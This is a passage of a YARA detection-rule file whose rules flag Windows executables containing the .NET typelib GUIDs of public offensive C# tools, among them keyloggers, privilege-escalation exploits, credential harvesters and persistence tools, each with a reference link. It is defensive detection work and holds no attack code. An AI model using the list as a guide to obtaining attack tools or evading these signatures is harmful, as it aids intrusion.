        $typelibguid7 = "8de42da3-be99-4e7e-a3d2-3f65e7c1abce" ascii nocase wide
        $typelibguid8 = "bee88186-769a-452c-9dd9-d0e0815d92bf" ascii nocase wide
        $typelibguid9 = "9042b543-13d1-42b3-a5b6-5cc9ad55e150" ascii nocase wide
        $typelibguid10 = "6aa4e392-aaaf-4408-b550-85863dd4baaf" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DarkFender {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xyg3n/DarkFender"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "12fdf7ce-4a7c-41b6-9b32-766ddd299beb" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

/* FPs with IronPython
rule HKTL_NET_GUID_IronKit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nshalabi/IronKit"
        author = "Arnim Rupp"
        score = 50
        date = "2020-12-13"
    strings:
        $typelibguid0 = "68e40495-c34a-4539-b43e-9e4e6f11a9fb" ascii nocase wide
        $typelibguid1 = "641cd52d-3886-4a74-b590-2a05621502a4" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}
*/

rule HKTL_NET_GUID_MinerDropper {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/DylanAlloy/MinerDropper"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "46a7af83-1da7-40b2-9d86-6fd6223f6791" ascii nocase wide
        $typelibguid1 = "8433a693-f39d-451b-955b-31c3e7fa6825" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpDomainSpray {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/HunnicCyber/SharpDomainSpray"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "76ffa92b-429b-4865-970d-4e7678ac34ea" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_iSpyKeylogger {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mwsrc/iSpyKeylogger"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "ccc0a386-c4ce-42ef-aaea-b2af7eff4ad8" ascii nocase wide
        $typelibguid1 = "816b8b90-2975-46d3-aac9-3c45b26437fa" ascii nocase wide
        $typelibguid2 = "279b5533-d3ac-438f-ba89-3fe9de2da263" ascii nocase wide
        $typelibguid3 = "88d3dc02-2853-4bf0-b6dc-ad31f5135d26" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SolarFlare {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mubix/solarflare"
        author = "Arnim Rupp"
        date = "2020-12-15"
    strings:
        $typelibguid0 = "ca60e49e-eee9-409b-8d1a-d19f1d27b7e4" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Snaffler {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SnaffCon/Snaffler"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "2aa060b4-de88-4d2a-a26a-760c1cefec3e" ascii nocase wide
        $typelibguid1 = "b118802d-2e46-4e41-aac7-9ee890268f8b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpShares {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/djhohnstein/SharpShares/"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "fe9fdde5-3f38-4f14-8c64-c3328c215cf2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpEDRChecker {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/PwnDexter/SharpEDRChecker"
        author = "Arnim Rupp"
        date = "2020-12-18"
    strings:
        $typelibguid0 = "bdfee233-3fed-42e5-aa64-492eb2ac7047" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpClipHistory {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FSecureLABS/SharpClipHistory"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "1126d5b4-efc7-4b33-a594-b963f107fe82" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "fbb1abcf-2b06-47a0-9311-17ba3d0f2a50" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Absinthe {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cameronhotchkies/Absinthe"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "9936ae73-fb4e-4c5e-a5fb-f8aaeb3b9bd6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ExploitRemotingService {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tyranid/ExploitRemotingService"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "fd17ae38-2fd3-405f-b85b-e9d14e8e8261" ascii nocase wide
        $typelibguid1 = "1850b9bb-4a23-4d74-96b8-58f274674566" ascii nocase wide
        $typelibguid2 = "297cbca1-efa3-4f2a-8d5f-e1faf02ba587" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Xploit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/shargon/Xploit"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "4545cfde-9ee5-4f1b-b966-d128af0b9a6e" ascii nocase wide
        $typelibguid1 = "33849d2b-3be8-41e8-a1e2-614c94c4533c" ascii nocase wide
        $typelibguid2 = "c2dc73cc-a959-4965-8499-a9e1720e594b" ascii nocase wide
        $typelibguid3 = "77059fa1-4b7d-4406-bc1a-cb261086f915" ascii nocase wide
        $typelibguid4 = "a4a04c4d-5490-4309-9c90-351e5e5fd6d1" ascii nocase wide
        $typelibguid5 = "ca64f918-3296-4b7d-9ce6-b98389896765" ascii nocase wide
        $typelibguid6 = "10fe32a0-d791-47b2-8530-0b19d91434f7" ascii nocase wide
        $typelibguid7 = "679bba57-3063-4f17-b491-4f0a730d6b02" ascii nocase wide
        $typelibguid8 = "0981e164-5930-4ba0-983c-1cf679e5033f" ascii nocase wide
        $typelibguid9 = "2a844ca2-5d6c-45b5-963b-7dca1140e16f" ascii nocase wide
        $typelibguid10 = "7d75ca11-8745-4382-b3eb-c41416dbc48c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PoC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/thezdi/PoC"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "89f9d411-e273-41bb-8711-209fd251ca88" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpGPOAbuse {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FSecureLABS/SharpGPOAbuse"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "4f495784-b443-4838-9fa6-9149293af785" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Watson {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/Watson"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "49ad5f38-9e37-4967-9e84-fe19c7434ed7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_StandIn {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FuzzySecurity/StandIn"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "01c142ba-7af1-48d6-b185-81147a2f7db7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_azure_password_harvesting {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/guardicore/azure_password_harvesting"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "7ad1ff2d-32ac-4c54-b615-9bb164160dac" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PowerOPS {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/fdiskyou/PowerOPS"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "2a3c5921-7442-42c3-8cb9-24f21d0b2414" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Random_CSharpTools {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/xorrior/Random-CSharpTools"
        author = "Arnim Rupp"
        date = "2020-12-21"
    strings:
        $typelibguid0 = "f7fc19da-67a3-437d-b3b0-2a257f77a00b" ascii nocase wide
        $typelibguid1 = "47e85bb6-9138-4374-8092-0aeb301fe64b" ascii nocase wide
        $typelibguid2 = "c7d854d8-4e3a-43a6-872f-e0710e5943f7" ascii nocase wide
        $typelibguid3 = "d6685430-8d8d-4e2e-b202-de14efa25211" ascii nocase wide
        $typelibguid4 = "1df925fc-9a89-4170-b763-1c735430b7d0" ascii nocase wide
        $typelibguid5 = "817cc61b-8471-4c1e-b5d6-c754fc550a03" ascii nocase wide
        $typelibguid6 = "60116613-c74e-41b9-b80e-35e02f25891e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CVE_2020_0668 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/RedCursorSecurityConsulting/CVE-2020-0668"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "1b4c5ec1-2845-40fd-a173-62c450f12ea5" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_WindowsRpcClients {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tyranid/WindowsRpcClients"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "843d8862-42eb-49ee-94e6-bca798dd33ea" ascii nocase wide
        $typelibguid1 = "632e4c3b-3013-46fc-bc6e-22828bf629e3" ascii nocase wide
        $typelibguid2 = "a2091d2f-6f7e-4118-a203-4cea4bea6bfa" ascii nocase wide
        $typelibguid3 = "950ef8ce-ec92-4e02-b122-0d41d83065b8" ascii nocase wide
        $typelibguid4 = "d51301bc-31aa-4475-8944-882ecf80e10d" ascii nocase wide
        $typelibguid5 = "823ff111-4de2-4637-af01-4bdc3ca4cf15" ascii nocase wide
        $typelibguid6 = "5d28f15e-3bb8-4088-abe0-b517b31d4595" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpFruit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rvrsh3ll/SharpFruit"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "3da2f6de-75be-4c9d-8070-08da45e79761" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpWitness {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/SharpWitness"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "b9f6ec34-4ccc-4247-bcef-c1daab9b4469" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RexCrypter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/syrex1013/RexCrypter"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "10cd7c1c-e56d-4b1b-80dc-e4c496c5fec5" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharPersist {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/fireeye/SharPersist"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "9d1b853e-58f1-4ba5-aefc-5c221ca30e48" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CVE_2019_1253 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/padovah4ck/CVE-2019-1253"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "584964c1-f983-498d-8370-23e27fdd0399" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_scout {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jaredhaight/scout"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "d9c76e82-b848-47d4-8f22-99bf22a8ee11" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Grouper2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/l0ss/Grouper2/"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "5decaea3-2610-4065-99dc-65b9b4ba6ccd" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CasperStager {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ustayready/CasperStager"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "c653a9f2-0939-43c8-9b93-fed5e2e4c7e6" ascii nocase wide
        $typelibguid1 = "48dfc55e-6ae5-4a36-abef-14bc09d7510b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_TellMeYourSecrets {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xbadjuju/TellMeYourSecrets"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "9b448062-7219-4d82-9a0a-e784c4b3aa27" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpExcel4_DCOM {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rvrsh3ll/SharpExcel4-DCOM"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "68b83ce5-bbd9-4ee3-b1cc-5e9223fab52b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpShooter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mdsecactivebreach/SharpShooter"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "56598f1c-6d88-4994-a392-af337abe5777" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_NoMSBuild {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rvrsh3ll/NoMSBuild"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "034a7b9f-18df-45da-b870-0e1cef500215" ascii nocase wide
        $typelibguid1 = "59b449d7-c1e8-4f47-80b8-7375178961db" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_TeleShadow2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ParsingTeam/TeleShadow2"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "42c5c356-39cf-4c07-96df-ebb0ccf78ca4" ascii nocase wide
        $typelibguid1 = "0242b5b1-4d26-413e-8c8c-13b4ed30d510" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BadPotato {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/BeichenDream/BadPotato"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "0527a14f-1591-4d94-943e-d6d784a50549" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_LethalHTA {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/codewhitesec/LethalHTA"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "784cde17-ff0f-4e43-911a-19119e89c43f" ascii nocase wide
        $typelibguid1 = "7e2de2c0-61dc-43ab-a0ec-c27ee2172ea6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpStat {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Raikia/SharpStat"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "ffc5c721-49c8-448d-8ff4-2e3a7b7cc383" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SneakyService {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/malcomvetter/SneakyService"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "897819d5-58e0-46a0-8e1a-91ea6a269d84" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpExec {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/anthemtotheego/SharpExec"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "7fbad126-e21c-4c4e-a9f0-613fcf585a71" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCOM {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rvrsh3ll/SharpCOM"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "51960f7d-76fe-499f-afbd-acabd7ba50d1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Inception {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/two06/Inception"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "03d96b8c-efd1-44a9-8db2-0b74db5d247a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_sharpwmi {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/QAX-A-Team/sharpwmi"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "bb357d38-6dc1-4f20-a54c-d664bd20677e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CVE_2019_1064 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/RythmStick/CVE-2019-1064"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "ff97e98a-635e-4ea9-b2d0-1a13f6bdbc38" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Tokenvator {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xbadjuju/Tokenvator"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "4b2b3bd4-d28f-44cc-96b3-4a2f64213109" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_WheresMyImplant {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xbadjuju/WheresMyImplant"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "cca59e4e-ce4d-40fc-965f-34560330c7e6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Naga {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/byt3bl33d3r/Naga"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "99428732-4979-47b6-a323-0bb7d6d07c95" ascii nocase wide
        $typelibguid1 = "a2c9488f-6067-4b17-8c6f-2d464e65c535" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpBox {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/P1CKLES/SharpBox"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "616c1afb-2944-42ed-9951-bf435cadb600" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_rundotnetdll32 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xbadjuju/rundotnetdll32"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "a766db28-94b6-4ed1-aef9-5200bbdd8ca7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AntiDebug {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/malcomvetter/AntiDebug"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "997265c1-1342-4d44-aded-67964a32f859" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DInvisibleRegistry {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NVISO-BE/DInvisibleRegistry"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "31d576fb-9fb9-455e-ab02-c78981634c65" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_TikiTorch {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/TikiTorch"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "806c6c72-4adc-43d9-b028-6872fa48d334" ascii nocase wide
        $typelibguid1 = "2ef9d8f7-6b77-4b75-822b-6a53a922c30f" ascii nocase wide
        $typelibguid2 = "8f5f3a95-f05c-4dce-8bc3-d0a0d4153db6" ascii nocase wide
        $typelibguid3 = "1f707405-9708-4a34-a809-2c62b84d4f0a" ascii nocase wide
        $typelibguid4 = "97421325-b6d8-49e5-adf0-e2126abc17ee" ascii nocase wide
        $typelibguid5 = "06c247da-e2e1-47f3-bc3c-da0838a6df1f" ascii nocase wide
        $typelibguid6 = "fc700ac6-5182-421f-8853-0ad18cdbeb39" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_HiveJack {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Viralmaniar/HiveJack"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "e12e62fe-bea3-4989-bf04-6f76028623e3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DecryptAutoLogon {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/securesean/DecryptAutoLogon"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "015a37fc-53d0-499b-bffe-ab88c5086040" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UnstoppableService {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/malcomvetter/UnstoppableService"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "0c117ee5-2a21-dead-beef-8cc7f0caaa86" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpWMI {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/SharpWMI"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "6dd22880-dac5-4b4d-9c91-8c35cc7b8180" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_EWSToolkit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/EWSToolkit"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "ca536d67-53c9-43b5-8bc8-9a05fdc567ed" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SweetPotato {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/CCob/SweetPotato"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "6aeb5004-6093-4c23-aeae-911d64cacc58" ascii nocase wide
        $typelibguid1 = "1bf9c10f-6f89-4520-9d2e-aaf17d17ba5e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_memscan {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nccgroup/memscan"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "79462f87-8418-4834-9356-8c11e44ce189" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpStay {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xthirteen/SharpStay"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "2963c954-7b1e-47f5-b4fa-2fc1f0d56aea" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpLocker {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Pickfordmatt/SharpLocker"
        author = "Arnim Rupp"
        date = "2020-12-28"
